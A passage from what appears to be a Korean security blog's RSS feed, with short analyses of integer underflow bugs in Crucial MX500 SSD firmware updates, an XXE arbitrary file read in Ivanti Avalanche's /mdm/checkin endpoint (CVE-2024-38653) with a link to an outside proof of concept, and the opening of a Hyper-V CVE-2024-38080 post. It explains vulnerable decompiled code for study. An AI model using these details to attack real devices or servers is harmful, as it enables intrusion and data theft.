&#xD0D1;&#xC7AC;&#xB41C; &#xD38C;&#xC6E8;&#xC5B4; M3CR046 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC138; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xB294;&#xB370;, &#xC138; &#xCDE8;&#xC57D;&#xC810; &#xBAA8;&#xB450; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC758; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC778; <code>ATA PIO DOWNLOAD-MICROCODE (0x92)</code> &#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; ATA command Handler&#xB85C; &#xC804;&#xC1A1;&#xB41C; &#xCCAB; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C; &#xD06C;&#xAE30;&#xAC00; &#xC139;&#xD130;&#xC758; &#xAE30;&#xBCF8; &#xD06C;&#xAE30;&#xC778; <code>0x200</code>&#xBCF4;&#xB2E4; &#xD070; &#xACBD;&#xC6B0;&#xC5D0; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> ((g_blocks_copied == <span class="hljs-number">0</span>) &amp;&amp; (lower_bound_fw_offset &lt;= __next_offset)) { curr_bytes_to_copy = (__next_offset - lower_bound_fw_offset) * <span class="hljs-number">0x200</span>; some_index = <span class="hljs-number">0x200</span> - (__next_offset - lower_bound_fw_offset) &amp; <span class="hljs-number">0xffff</span>; }</code></pre><p><code>some_index</code>&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xB54C; &#xB2E4;&#xC74C; &#xCCAD;&#xD06C;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC624;&#xD504;&#xC14B;(&#xCCAB; &#xCCAD;&#xD06C;&#xC774;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xCCAD;&#xD06C;&#xC758; &#xD06C;&#xAE30;)&#xC778; <code>__next_offset</code>&#xACFC; <code>lower_bound_fw_offset</code> &#xC5F0;&#xC0B0;&#xAC12;&#xC744; &#xC139;&#xD130; &#xD06C;&#xAE30;&#xC778; 0x200&#xC5D0;&#xC11C; &#xBE7C;&#xB294;&#xB370;, &#xC774;&#xB54C; <code>lower_bound_fw_offset</code> &#xC740; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xB41C; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xBA70; 0&#xC73C;&#xB85C; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>next_offset</code>&#xC774; &#xC139;&#xD130; &#xD06C;&#xAE30;&#xC778; 0x200&#xBCF4;&#xB2E4; &#xD070; &#xACBD;&#xC6B0; <code>some_index</code>&#xC5D0;&#xC11C; integer underflow&#xAC00; &#xBC1C;&#xC0DD;&#xD574; &#xCD5C;&#xB300; <code>0xFFFF</code>&#xAE4C;&#xC9C0; &#xB354; &#xD070; &#xAC12;&#xC774; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((lower_bound_fw_offset &lt;= __next_offset) &amp;&amp; (current_offset &lt; higher_bound_fw_offset)) { r_maybe_some_efficient_data_transfer (<span class="hljs-number">1</span>,some_index * <span class="hljs-number">0x200</span> + Ox40000000, &amp;g_download_buffer + (uint)g_blocks_copied * Ox200, curr_bytes_to_copy,<span class="hljs-number">0</span>,<span class="hljs-number">1</span> ); g_blocks_copied = g_blocks_copied + (<span class="hljs-keyword">short</span>)(curr_bytes_to_copy &gt;&gt; <span class="hljs-number">9</span>); }</code></pre><p>&#xC774;&#xD6C4; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC84;&#xD37C;&#xB85C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xC608;&#xC0C1;&#xBCF4;&#xB2E4; &#xD070;  <code>some_index</code>&#xAC12;&#xC744; &#xC774;&#xC6A9;&#xD574; src &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xACC4; &#xB418;&#xC5B4; &#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xB3D9;&#xC791;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0; &#xD06C;&#xAE30; &#xACC4;&#xC0B0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>M3CR046 &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xD06C;&#xAE30;&#xB294; 0x242400 bytes(0x1212 sectors)&#xC774;&#xBA70;, &#xD574;&#xB2F9; &#xC774;&#xBBF8;&#xC9C0; &#xB0B4;&#xBD80;&#xC5D0;&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD6C4; &#xD50C;&#xB798;&#xC2DC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xAE30;&#xB85D;&#xB418;&#xB294; &#xB0B4;&#xBD80; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0; 3&#xAC1C;&#xAC00; &#xAC01;&#xAC01; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xD06C;&#xAE30;&#xB294; 0xC0C00 bytes(0x606 sectors)&#xC774;&#xBBC0;&#xB85C; 0x606&#xC73C;&#xB85C; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB41C; <code>higher_bound_fw_offset</code>&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD06C;&#xAE30;&#xB97C; &#xCD08;&#xACFC;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((g_blocks_copied == <span class="hljs-number">0</span>) &amp;&amp; (lower_bound_fw_offset &lt;= __next_offset)) { curr_bytes_to_copy = (__next_offset - lower_bound_fw_offset) * <span class="hljs-number">0x200</span>; some_index = <span class="hljs-number">0x200</span> - (__next_offset - lower_bound_fw_offset) &amp; <span class="hljs-number">0xffff</span>; } <span class="hljs-keyword">else</span> { curr_bytes_to_copy = <span class="hljs-number">0x40000</span>; <span class="hljs-comment">/* Exactly 0x200 blocks */</span> some_index = <span class="hljs-number">0</span>; }<span class="hljs-keyword">if</span> (higher_bound_fw_offset &lt;= __next_offset) { curr_bytes_to_copy = curr_bytes_to_copy + (__next_offset - higher_bound_fw_offset) * <span class="hljs-number">-0x200</span>; } </code></pre><p>&#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC758; if &#xBD84;&#xAE30; &#xC2E4;&#xD589; &#xC870;&#xAC74;&#xC778; &#xCCAB; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C;&#xAC00; &#xC544;&#xB2CC; &#xACBD;&#xC6B0;, else &#xBD84;&#xAE30;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C;&#xAC00; &#xC544;&#xB2C8;&#xBA74;&#xC11C; &#xD604;&#xC7AC; &#xCCAD;&#xD06C;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xC139;&#xD130; &#xD06C;&#xAE30;&#xC778; 0x200&#xBCF4;&#xB2E4; &#xD070; &#xACBD;&#xC6B0; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xC774;&#xBA70;, &#xBCF5;&#xC0AC;&#xD560; &#xD06C;&#xAE30;&#xB97C; 0x200&#xC139;&#xD130; &#xD06C;&#xAE30;(0x40000)&#xB9CC;&#xD07C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xC804;&#xCCB4; &#xD06C;&#xAE30;&#xAC00; <code>higher_bound_fw_offset</code>(0x606)&#xBCF4;&#xB2E4; &#xD070; &#xACBD;&#xC6B0; 0x606 * 0x200 bytes&#xB97C; &#xCD08;&#xACFC;&#xD558;&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xC218;&#xB97C; &#xC798;&#xB77C;&#xB0B4;&#xB294; &#xBEBC;&#xC148; &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xCCAD;&#xD06C;&#xB85C; &#xC778;&#xD574; <code>__next_offset</code> &#xAC12;&#xC774; 0x806&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; integer underflow&#xB85C; &#xC778;&#xD574; <code>curr_bytes_to_copy</code>&#xAC00; &#xC608;&#xC0C1;&#xBCF4;&#xB2E4; &#xD070; &#xAC12;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC84;&#xD37C;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xBC14;&#xC774;&#xD2B8; &#xC218;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xB54C; overflow&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC138; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810; &#xB610;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0; &#xD06C;&#xAE30; &#xACC4;&#xC0B0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>M3CR046&#xC758; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0; &#xD06C;&#xAE30;&#xB294; &#xC55E;&#xC11C; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774; 0x242400 bytes(0x1212 sectors)&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC5ED;&#xC2DC; &#xC804;&#xC1A1;&#xB41C; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xCD1D; &#xD06C;&#xAE30;&#xAC00; 0x1212 &#xC139;&#xD130;&#xB97C; &#xCD08;&#xACFC;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((current_offset != g_next_offset) || (__subcommand != g_last_subcommand)) {  g_next_offset = <span class="hljs-number">0</span>;  g_blocks_copied = <span class="hljs-number">0</span>;  DAT_ram_10005fe8 = <span class="hljs-number">2</span>;  current_offset = <span class="hljs-number">2</span>;  <span class="hljs-keyword">goto</span> LAB_ram_80024b66;}__next_offset = g_blocks_to_transfer + current_offset &amp; <span class="hljs-number">0xffff</span>; <span class="hljs-comment">// (1) update __next_offset</span>g_next_offset = (ushort)(g_blocks_to_transfer + current_offset);    }    g_last_subcommand = bVar1;  }  puVar4 = &amp;g_next_offset;  <span class="hljs-keyword">if</span> (<span class="hljs-number">0x1212</span> &lt; __next_offset) {   <span class="hljs-comment">// (2) updated __next_offset is less than 0x1212</span>    g_next_offset = <span class="hljs-number">0</span>;    DAT_ram_10005fe8 = <span class="hljs-number">3</span>;    iVar3 = <span class="hljs-number">3</span>;LAB_ram_80024e08:    g_blocks_copied = <span class="hljs-number">0</span>;    FUN_ram_00007b14(<span class="hljs-number">0x85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,iVar3,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    FUN_ram_80023480(<span class="hljs-number">4</span>);    <span class="hljs-keyword">return</span>;  }</code></pre><p>&#xC815;&#xC0C1;&#xC801;&#xC778; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC758; &#xACBD;&#xC6B0; <code>__next_offset</code>&#xC774; 0x1212&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; (2)&#xC5D0;&#xC11C; &#xC0C1;&#xD0DC;&#xCF54;&#xB4DC;&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD558;&#xACE0; &#xC624;&#xB958;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC804;&#xC1A1;&#xB41C; &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xCD1D; &#xD06C;&#xAE30;&#xAC00; 0x1212 &#xC139;&#xD130;&#xB97C; &#xCD08;&#xACFC;&#xD558;&#xB354;&#xB77C;&#xB3C4;, &#xB2E4;&#xC74C;&#xC5D0; &#xCC98;&#xB9AC;&#xD560; ATA command&#xAC00; &#xCDA9;&#xBD84;&#xD788; &#xD070; &#xACBD;&#xC6B0; <code>__next_offset</code>&#xC774; (1)&#xC5D0;&#xC11C; &#xC7AC;&#xC124;&#xC815;&#xB418;&#xC5B4; (2)&#xC758; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xB370;&#xC774;&#xD130; &#xC804;&#xC1A1; &#xB85C;&#xC9C1;&#xC744; &#xC218;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC84;&#xD37C;&#xB97C; &#xB118;&#xC5B4; buffer overflow&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC55E;&#xC120; &#xB450; &#xC0AC;&#xB840;&#xC640; &#xB2EC;&#xB9AC; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xB97C; &#xC989;&#xC2DC; &#xCDA9;&#xB3CC;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC544; &#xC545;&#xC6A9; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB354; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/integer-underflow/">integer underflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/buffer-overflow/">buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/micron/">micron</category>
      
      <category domain="https://hackyboiz.github.io/tags/crucial-mx500/">crucial mx500</category>
      
      <category domain="https://hackyboiz.github.io/tags/silicon-motion/">silicon-motion</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/08/l0ch/2024-09-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-38653: Ivanti Avalanche의 XXE로 인한 임의 파일 읽기 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/04/ogu123/cve-2024-38653/</link>
      <guid>https://hackyboiz.github.io/2024/09/04/ogu123/cve-2024-38653/</guid>
      <pubDate>Wed, 04 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/D4mianWayne/POCs/tree/main/CVE%202024-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/D4mianWayne/POCs/tree/main/CVE%202024-38653">https://github.com/D4mianWayne/POCs/tree/main/CVE%202024-38653</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Avalanche 6.3.1, 6.3.4, 6.4.0, 6.4.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ivanti Avalanche&#xB294; &#xBAA8;&#xBC14;&#xC77C; &#xC7A5;&#xCE58; &#xAD00;&#xB9AC; &#xC194;&#xB8E8;&#xC158;(MDM)&#xC73C;&#xB85C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBC30;&#xD3EC;, &#xC54C;&#xB9BC; &#xBC0F; &#xBCF4;&#xACE0;&#xC11C; &#xAD00;&#xB9AC;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-38653&#xC740; XXE &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>/mdm/checkin</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; PUT &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xACBD;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">sin = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>read<span class="hljs-constructor">File((InputStream)</span>req.get<span class="hljs-constructor">InputStream()</span>);String sessionId = req.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;sessionId&quot;</span>)</span>;String udidForVendor = req.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;udid&quot;</span>)</span>;boolean deviceSimulator = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ServletUtil</span>.</span></span>parse<span class="hljs-constructor">Boolean(<span class="hljs-params">req</span>.<span class="hljs-params">getParameter</span>(<span class="hljs-string">&quot;deviceSimulator&quot;</span>)</span>);IDeviceAPI dapi = this.m_apiVector.get<span class="hljs-constructor">DbDeviceAPI()</span>;Map&lt;String, String&gt; pairs = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PList</span>.</span></span>decode<span class="hljs-constructor">ToMap(<span class="hljs-params">sin</span>)</span>;</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC740;<code>CheckinServlet.java</code> &#xD30C;&#xC77C;&#xC758; <code>doPut</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>/mdm/checkin</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; PUT &#xC694;&#xCCAD;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xBA74;, <code>doPut</code> &#xBA54;&#xC18C;&#xB4DC;&#xB294; &#xC694;&#xCCAD;&#xC758; &#xBCF8;&#xBB38;&#xC744;<code>PList.decodeToMap</code> &#xBA54;&#xC18C;&#xB4DC;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;<span class="hljs-keyword">String</span>, <span class="hljs-keyword">String</span>&gt; decodeToMap(<span class="hljs-keyword">String</span> xml) throws XMLStreamException {    Map&lt;<span class="hljs-keyword">String</span>, <span class="hljs-keyword">String</span>&gt; pairs = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>&lt;&gt;();    XMLInputFactory xmlInputFactory = XMLInputFactory.<span class="hljs-keyword">new</span><span class="hljs-type">Factory</span>();    XMLStreamReader xmlStreamReader = xmlInputFactory.createXMLStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-type">StringReader</span>(xml));    <span class="hljs-keyword">do</span> {        xmlStreamReader.next();        <span class="hljs-keyword">String</span> name = getName(xmlStreamReader);        <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">null</span>)            <span class="hljs-keyword">continue</span>;          <span class="hljs-keyword">String</span> value = getValue(xmlStreamReader);        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>)            <span class="hljs-keyword">continue</span>;          pairs.put(name, value);    } <span class="hljs-keyword">while</span> (xmlStreamReader.getEventType() != <span class="hljs-number">8</span>);    <span class="hljs-keyword">return</span> pairs;}</code></pre><p><code>PList.decodeToMap</code> &#xBA54;&#xC18C;&#xB4DC;&#xB294; &#xC804;&#xB2EC;&#xBC1B;&#xC740; &#xBCF8;&#xBB38;&#xC5D0;&#xC11C; XML &#xB370;&#xC774;&#xD130;&#xB97C; &#xD30C;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; <code>XMLInputFactory</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; <code>XMLStreamReader</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, <code>XMLStreamReader</code>&#xAC00; XML &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC81C;&#xB294; <code>XMLInputFactory</code>&#xAC00; &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB3C4;&#xB85D; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC5B4; XXE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/09/04/ogu123/cve-2024-38653/image1.png" alt></p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; <a href="https://github.com/D4mianWayne/POCs/blob/main/CVE%202024-38653/ivanti-avalanche-cve-2024-38653.py">PoC</a>&#xB97C; &#xD1B5;&#xD574; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC;, XML &#xD30C;&#xC11C;&#xAC00; &#xC904; &#xBC14;&#xAFC8; &#xBB38;&#xC790;(<code>\n</code>)&#xB97C; &#xC81C;&#xAC70;&#xD574;&#xBC84;&#xB9AC;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC5EC;&#xB7EC; &#xC904;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC73C;&#xBA74; &#xCCAB; &#xC904;&#xB9CC; &#xC77D;&#xB294; &#xC81C;&#xD55C; &#xC0AC;&#xD56D;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>sds_server\com\wavelink\sds\ios\*</code> &#xACBD;&#xB85C;&#xC5D0; &#xC788;&#xB294; iOS &#xAD00;&#xB828; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti-Avalanche/">Ivanti Avalanche</category>
      
      <category domain="https://hackyboiz.github.io/tags/XXE/">XXE</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/04/ogu123/cve-2024-38653/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Hyper-V 1-day Class: CVE-2024-38080</title>
      <link>https://hackyboiz.github.io/2024/09/01/pwndorei/hyperv-1dayclass_CVE-2024-38080/</link>
      <guid>https://hackyboiz.github.io/2024/09/01/pwndorei/hyperv-1dayclass_CVE-2024-38080/</guid>
      <pubDate>Sun, 01 Sep 2024 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, pwndorei&#xC785;&#xB2C8;&#xB2E4;. &#xC624;&#xB79C;&#xB9CC;&#xC5D0; Hyper-V &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC694;&#xC998; &#xC5F0;&#xAD6C;&#xAE00; &#xC5C5;&#xB85C;&#xB4DC; &#xC8FC;&#xAE30;&#xAC00; &#xC880; &#xC218;&#xC0C1;&#xD560; &#xC815;&#xB3C4;&#xB85C; &#xC9E7;&#xC544;&#xC84C;&#xC8E0;? &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xC81C;&#xAC00; &#xC5F4;&#xC2EC;&#xD788; &#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC99D;&#xAC70;&#xB78D;&#xB2C8;&#xB2E4;..</p><p>&#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC740; &#xC81C;&#xBAA9;&#xCC98;&#xB7FC; CVE-2024-38080&#xC758; &#xBD84;&#xC11D; &#xBC0F; poc &#xCF54;&#xB4DC; &#xC791;&#xC131;&#xC785;&#xB2C8;&#xB2E4;! &#xC55E;&#xC73C;&#xB85C;&#xB294; Hyper-V 1-day Class&#xB77C;&#xB294; &#xC2DC;&#xB9AC;&#xC988;&#xB85C; Patch Tuesday&#xB9C8;&#xB2E4; &#xC62C;&#xB77C;&#xC624;&#xB294; Hyper-V &#xCDE8;&#xC57D;&#xC810; &#xC5F0;&#xAD6C;&#xAE00;&#xC774; &#xC62C;&#xB77C;&#xC62C;&#xAC81;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B;</p><p>&#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; 7&#xC6D4;&#xC5D0; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xACE0; &#xC9C4;&#xC791;&#xC5D0; &#xBD84;&#xC11D;&#xC740; &#xB2E4; &#xB05D;&#xB0AC;&#xC5C8;&#xB294;&#xB370; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD574;&#xBCF4;&#xACA0;&#xB2E4;&#xACE0; &#xC0BD;&#xC9C8;&#xC744; &#xC880; &#xB9CE;&#xC774; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B; &#xC2E4;&#xB825;&#xC744; &#xB354; &#xD0A4;&#xC6CC;&#xC11C; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xAF2D; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xAE4C;&#xC9C0; &#xC9DC;&#xBCF4;&#xACE0; &#xC2F6;&#xB124;&#xC694;!&#x2026; &#xADF8;&#xB7FC; &#xC7AC;&#xBC0C;&#xAC8C; &#xC77D;&#xC5B4;&#xC8FC;&#xC2ED;&#xC1FC;!</p><h1 id="CVE-2024-38080"><a href="#CVE-2024-38080" class="headerlink" 